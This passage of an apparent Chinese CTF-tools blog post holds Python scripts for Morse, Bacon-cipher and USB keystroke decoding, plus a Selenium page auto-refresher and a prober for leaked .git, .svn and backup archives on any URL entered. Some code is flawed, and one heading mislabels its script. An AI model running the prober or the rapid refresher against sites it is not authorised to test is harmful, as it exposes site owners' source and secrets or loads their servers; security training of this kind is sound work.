class="string">'5'</span>,</span><br><span class="line">        <span class="string">'-....'</span>: <span class="string">'6'</span>,</span><br><span class="line">        <span class="string">'--...'</span>: <span class="string">'7'</span>,</span><br><span class="line">        <span class="string">'---..'</span>: <span class="string">'8'</span>,</span><br><span class="line">        <span class="string">'----.'</span>: <span class="string">'9'</span>,</span><br><span class="line">        <span class="string">'-----'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'.-.-.-'</span>: <span class="string">'.'</span>,</span><br><span class="line">        <span class="string">'..--..'</span>: <span class="string">'?'</span>,</span><br><span class="line">        <span class="string">'-.-.--'</span>: <span class="string">'!'</span>,</span><br><span class="line">        <span class="string">'-..-.'</span>: <span class="string">'/'</span>,</span><br><span class="line">        <span class="string">'.--.-.'</span>: <span class="string">'@'</span>,</span><br><span class="line">        <span class="string">'---...'</span>: <span class="string">':'</span>,</span><br><span class="line">        <span class="string">'-.--.'</span>: <span class="string">'('</span>,</span><br><span class="line">        <span class="string">'-.--.-'</span>: <span class="string">')'</span>,</span><br><span class="line">        <span class="string">'-....-'</span>: <span class="string">'-'</span>,</span><br><span class="line">        <span class="string">'.-.-.-'</span>: <span class="string">'.'</span>,</span><br><span class="line">        <span class="string">'----.--'</span>: <span class="string">'&#123;'</span>,</span><br><span class="line">        <span class="string">'-----.-'</span>: <span class="string">'&#125;'</span>,</span><br><span class="line">        <span class="string">'-....-'</span>: <span class="string">'='</span>,</span><br><span class="line">        <span class="string">'.----.'</span>: <span class="string">'\''</span>,</span><br><span class="line">        <span class="string">'..--.-'</span>: <span class="string">'_'</span>,</span><br><span class="line">        <span class="string">'...-..-'</span>: <span class="string">'$'</span>,</span><br><span class="line">        <span class="string">'-.-.-.'</span>: <span class="string">';'</span>,</span><br><span class="line">        <span class="string">'.-..-.'</span>: <span class="string">'"'</span>,</span><br><span class="line">        <span class="string">'. ...'</span>: <span class="string">'&amp;'</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">print</span> (dict[item],end=<span class="string">''</span>)</span><br><span class="line"><span class="comment">#print (s)</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="批量替换txt里字符"><a href="#批量替换txt里字符" class="headerlink" title="批量替换txt里字符"></a>批量替换txt里字符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.chdir(<span class="string">'C:\\Users\\Administrator\\Downloads'</span>) <span class="comment"># 跳到某盘</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'as_code.txt'</span>): <span class="comment"># 看一下这个文件是否存在</span></span><br><span class="line">    exit(<span class="number">-1</span>) <span class="comment">#，不存在就退出</span></span><br><span class="line">lines = open(<span class="string">'as_code.txt'</span>).readlines() <span class="comment">#打开文件，读入每一行</span></span><br><span class="line">fp = open(<span class="string">'as_code1.txt'</span>,<span class="string">'w'</span>) <span class="comment">#打开你要写的文件,不存在则创建</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> lines:</span><br><span class="line">    fp.write( s.replace(<span class="string">'s'</span>,<span class="string">'0'</span>).replace(<span class="string">'a'</span>,<span class="string">'1'</span>)) <span class="comment"># replace是替换，write是写入</span></span><br><span class="line">    fp.close() <span class="comment"># 关闭文件</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="web源码泄露探测"><a href="#web源码泄露探测" class="headerlink" title="web源码泄露探测"></a>web源码泄露探测</h2><p>用来探测一些常见的源码泄露<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">lists = [<span class="string">'/.git/config'</span>, <span class="string">'/.svn/entries'</span>, <span class="string">'web.rar'</span>, <span class="string">'www.zip'</span>, <span class="string">'www.rar'</span>, <span class="string">'wwwroot.rar'</span>, <span class="string">'1.rar'</span>, <span class="string">'bbs.zip'</span>, <span class="string">'website.rar'</span>]</span><br><span class="line">print(<span class="string">'- - - - - - - - - - - - - - - - - - - -'</span>)</span><br><span class="line">print(<span class="string">u'|    就是个自己用的小脚本 by Damya   |'</span>)</span><br><span class="line">print(<span class="string">'- - - - - - - - - - - - - - - - - - - -'</span>)</span><br><span class="line"><span class="comment"># 用来输入需要探测的网址</span></span><br><span class="line">address = input(<span class="string">'请输入URL地址：'</span>)</span><br><span class="line"><span class="comment"># 把列表里的元素一个一个遍历出来</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> lists:</span><br><span class="line">    <span class="comment"># 把网址和探测的文件连接到一起</span></span><br><span class="line">    tance = <span class="string">"%s/%s"</span> % (address, a)</span><br><span class="line">    <span class="comment"># print tance   </span></span><br><span class="line">    <span class="comment"># 使用 request 模块里的 get 来获取这个网址</span></span><br><span class="line">    qq = requests.get(url=tance)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取响应码并赋值给 dq</span></span><br><span class="line">    dq = qq.status_code</span><br><span class="line">    <span class="comment"># 判断响应码是否为 200 ，是，就进行下一步</span></span><br><span class="line">    <span class="keyword">if</span> dq == <span class="number">200</span> :</span><br><span class="line">        <span class="comment"># 输出 响应码和探测地址</span></span><br><span class="line">        print(<span class="string">u"响应码：[%s]  -  地址：%s"</span> % (dq, tance))</span><br><span class="line">    <span class="comment"># 如果响应码不是 200 就进行着一步</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 输入响应码和地址</span></span><br><span class="line">        print(<span class="string">u"响应码：[%s]  -  地址：%s"</span> % (dq, tance))</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="模拟自动刷新脚本"><a href="#模拟自动刷新脚本" class="headerlink" title="模拟自动刷新脚本"></a>模拟自动刷新脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refresh</span><span class="params">(url,num)</span>:</span></span><br><span class="line">    driver = webdriver.Chrome(<span class="string">"C:/python27/chromedriver.exe"</span>)</span><br><span class="line">    driver.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line">        driver.refresh()</span><br><span class="line">    print(<span class="string">'Browser will be close after 600s'</span>)</span><br><span class="line">    time.sleep(<span class="number">600</span>)</span><br><span class="line">    driver.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = input(<span class="string">"Please enter the url:\n"</span>)</span><br><span class="line">    num = int(input(<span class="string">"Enter the number of refresh:\n"</span>))</span><br><span class="line">    refresh(url,num)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="培根密码解密脚本"><a href="#培根密码解密脚本" class="headerlink" title="培根密码解密脚本"></a>培根密码解密脚本</h2><p>包含两种解法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">alphabet = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>]</span><br><span class="line"></span><br><span class="line">first_cipher = [<span class="string">"aaaaa"</span>,<span class="string">"aaaab"</span>,<span class="string">"aaaba"</span>,<span class="string">"aaabb"</span>,<span class="string">"aabaa"</span>,<span class="string">"aabab"</span>,<span class="string">"aabba"</span>,<span class="string">"aabbb"</span>,<span class="string">"abaaa"</span>,<span class="string">"abaab"</span>,<span class="string">"ababa"</span>,<span class="string">"ababb"</span>,<span class="string">"abbaa"</span>,<span class="string">"abbab"</span>,<span class="string">"abbba"</span>,<span class="string">"abbbb"</span>,<span class="string">"baaaa"</span>,<span class="string">"baaab"</span>,<span class="string">"baaba"</span>,<span class="string">"baabb"</span>,<span class="string">"babaa"</span>,<span class="string">"babab"</span>,<span class="string">"babba"</span>,<span class="string">"babbb"</span>,<span class="string">"bbaaa"</span>,<span class="string">"bbaab"</span>]</span><br><span class="line"></span><br><span class="line">second_cipher = [<span class="string">"aaaaa"</span>,<span class="string">"aaaab"</span>,<span class="string">"aaaba"</span>,<span class="string">"aaabb"</span>,<span class="string">"aabaa"</span>,<span class="string">"aabab"</span>,<span class="string">"aabba"</span>,<span class="string">"aabbb"</span>,<span class="string">"abaaa"</span>,<span class="string">"abaaa"</span>,<span class="string">"abaab"</span>,<span class="string">"ababa"</span>,<span class="string">"ababb"</span>,<span class="string">"abbaa"</span>,<span class="string">"abbab"</span>,<span class="string">"abbba"</span>,<span class="string">"abbbb"</span>,<span class="string">"baaaa"</span>,<span class="string">"baaab"</span>,<span class="string">"baaba"</span>,<span class="string">"baabb"</span>,<span class="string">"baabb"</span>,<span class="string">"babaa"</span>,<span class="string">"babab"</span>,<span class="string">"babba"</span>,<span class="string">"babbb"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">()</span>:</span></span><br><span class="line">    upper_flag = <span class="literal">False</span> <span class="comment"># 用于判断输入是否为大写</span></span><br><span class="line">    string = raw_input(<span class="string">"please input string to encode:\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> string.isupper():</span><br><span class="line">        upper_flag = <span class="literal">True</span></span><br><span class="line">        string = string.lower()</span><br><span class="line">    e_string1 = <span class="string">""</span></span><br><span class="line">    e_string2 = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> index == alphabet[i]:</span><br><span class="line">                e_string1 += first_cipher[i]</span><br><span class="line">                e_string2 += second_cipher[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> upper_flag:</span><br><span class="line">        e_string1 = e_string1.upper()</span><br><span class="line">        e_string2 = e_string2.upper()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"first encode method result is:\n"</span>+e_string1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"second encode method result is:\n"</span>+e_string2</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    upper_flag = <span class="literal">False</span>  <span class="comment"># 用于判断输入是否为大写</span></span><br><span class="line">    e_string = raw_input(<span class="string">"please input string to decode:\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> e_string.isupper():</span><br><span class="line">        upper_flag = <span class="literal">True</span></span><br><span class="line">        e_string = e_string.lower()</span><br><span class="line">    e_array = re.findall(<span class="string">".&#123;5&#125;"</span>,e_string)</span><br><span class="line">    d_string1 = <span class="string">""</span></span><br><span class="line">    d_string2 = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> e_array:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> index == first_cipher[i]:</span><br><span class="line">                d_string1 += alphabet[i]</span><br><span class="line">            <span class="keyword">if</span> index == second_cipher[i]:</span><br><span class="line">                d_string2 += alphabet[i]</span><br><span class="line">    <span class="keyword">if</span> upper_flag:</span><br><span class="line">        d_string1 = d_string1.upper()</span><br><span class="line">        d_string2 = d_string2.upper()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"first decode method result is:\n"</span>+d_string1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"second decode method result is:\n"</span>+d_string2</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\t\tcoding by qux"</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\t*******Bacon Encode_Decode System*******"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"input should be only lowercase or uppercase,cipher just include a,b(or A,B)"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"1.encode\n2.decode\n3.exit"</span></span><br><span class="line">        s_number = raw_input(<span class="string">"please input number to choose\n"</span>)</span><br><span class="line">        <span class="keyword">if</span> s_number == <span class="string">"1"</span>:</span><br><span class="line">            encode()</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">elif</span> s_number == <span class="string">"2"</span>:</span><br><span class="line">            decode()</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">elif</span> s_number == <span class="string">"3"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="敲击码转换脚本"><a href="#敲击码转换脚本" class="headerlink" title="敲击码转换脚本"></a>敲击码转换脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"\n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>,  <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="string">"""00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:17:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:17:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:0b:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:0c:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:0c:16:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:0c:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:10:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:10:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:1c:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:13:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:04:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:1a:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:1a:12:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:12:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:15:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:07:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:1e:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:28:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">keys = keys.split(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">"usb.dat"</span></span><br><span class="line"></span><br><span class="line">presses = []</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>: <span class="string">"a"</span>, <span class="string">"05"</span>: <span class="string">"b"</span>, <span class="string">"06"</span>: <span class="string">"c"</span>, <span class="string">"07"</span>: <span class="string">"d"</span>, <span class="string">"08"</span>: <span class="string">"e"</span>, <span class="string">"09"</span>: <span class="string">"f"</span>, <span class="string">"0a"</span>: <span class="string">"g"</span>, <span class="string">"0b"</span>: <span class="string">"h"</span>, <span class="string">"0c"</span>: <span class="string">"i"</span>,</span><br><span class="line">              <span class="string">"0d"</span>: <span class="string">"j"</span>, <span class="string">"0e"</span>: <span class="string">"k"</span>, <span class="string">"0f"</span>: <span class="string">"l"</span>, <span class="string">"10"</span>: <span class="string">"m"</span>, <span class="string">"11"</span>: <span class="string">"n"</span>, <span class="string">"12"</span>: <span class="string">"o"</span>, <span class="string">"13"</span>: <span class="string">"p"</span>, <span class="string">"14"</span>: <span class="string">"q"</span>, <span class="string">"15"</span>: <span class="string">"r"</span>,</span><br><span class="line">              <span class="string">"16"</span>: <span class="string">"s"</span>, <span class="string">"17"</span>: <span class="string">"t"</span>, <span class="string">"18"</span>: <span class="string">"u"</span>, <span class="string">"19"</span>: <span class="string">"v"</span>, <span class="string">"1a"</span>: <span class="string">"w"</span>, <span class="string">"1b"</span>: <span class="string">"x"</span>, <span class="string">"1c"</span>: <span class="string">"y"</span>, <span class="string">"1d"</span>: <span class="string">"z"</span>, <span class="string">"1e"</span>: <span class="string">"1"</span>,</span><br><span class="line">              <span class="string">"1f"</span>: <span class="string">"2"</span>, <span class="string">"20"</span>: <span class="string">"3"</span>, <span class="string">"21"</span>: <span class="string">"4"</span>, <span class="string">"22"</span>: <span class="string">"5"</span>, <span class="string">"23"</span>: <span class="string">"6"</span>, <span class="string">"24"</span>: <span class="string">"7"</span>, <span class="string">"25"</span>: <span class="string">"8"</span>, <span class="string">"26"</span>: <span class="string">"9"</span>, <span class="string">"27"</span>: <span class="string">"0"</span>,</span><br><span class="line">              <span class="string">"28"</span>: <span class="string">"&lt;RET&gt;"</span>, <span class="string">"29"</span>: <span class="string">"&lt;ESC&gt;"</span>, <span class="string">"2a"</span>: <span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>: <span class="string">"\t"</span>, <span class="string">"2c"</span>: <span class="string">"&lt;SPACE&gt;"</span>, <span class="string">"2d"</span>: <span class="string">"-"</span>, <span class="string">"2e"</span>: <span class="string">"="</span>, <span class="string">"2f"</span>: <span class="string">"["</span>,</span><br><span class="line">              <span class="string">"30"</span>: <span class="string">"]"</span>, <span class="string">"31"</span>: <span class="string">"\\"</span>, <span class="string">"32"</span>: <span class="string">"&lt;NON&gt;"</span>, <span class="string">"33"</span>: <span class="string">";"</span>, <span class="string">"34"</span>: <span class="string">"'"</span>, <span class="string">"35"</span>: <span class="string">"&lt;GA&gt;"</span>, <span class="string">"36"</span>: <span class="string">","</span>, <span class="string">"37"</span>: <span class="string">"."</span>, <span class="string">"38"</span>: <span class="string">"/"</span>,</span><br><span class="line">              <span class="string">"39"</span>: <span class="string">"&lt;CAP&gt;"</span>, <span class="string">"3a"</span>: <span class="string">"&lt;F1&gt;"</span>, <span class="string">"3b"</span>: <span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>: <span class="string">"&lt;F3&gt;"</span>, <span class="string">"3d"</span>: <span class="string">"&lt;F4&gt;"</span>, <span class="string">"3e"</span>: <span class="string">"&lt;F5&gt;"</span>, <span class="string">"3f"</span>: <span class="string">"&lt;F6&gt;"</span>,</span><br><span class="line">              <span class="string">"40"</span>: <span class="string">"&lt;F7&gt;"</span>, <span class="string">"41"</span>: <span class="string">"&lt;F8&gt;"</span>, <span class="string">"42"</span>: <span class="string">"&lt;F9&gt;"</span>, <span class="string">"43"</span>: <span class="string">"&lt;F10&gt;"</span>, <span class="string">"44"</span>: <span class="string">"&lt;F11&gt;"</span>, <span class="string">"45"</span>: <span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>: <span class="string">"A"</span>, <span class="string">"05"</span>: <span class="string">"B"</span>, <span class="string">"06"</span>: <span class="string">"C"</span>, <span class="string">"07"</span>: <span class="string">"D"</span>, <span class="string">"08"</span>: <span class="string">"E"</span>, <span class="string">"09"</span>: <span class="string">"F"</span>, <span class="string">"0a"</span>: <span class="string">"G"</span>, <span class="string">"0b"</span>: <span class="string">"H"</span>, <span class="string">"0c"</span>: <span class="string">"I"</span>,</span><br><span class="line">             <span class="string">"0d"</span>: <span class="string">"J"</span>, <span class="string">"0e"</span>: <span class="string">"K"</span>, <span class="string">"0f"</span>: <span class="string">"L"</span>, <span class="string">"10"</span>: <span class="string">"M"</span>, <span class="string">"11"</span>: <span class="string">"N"</span>, <span 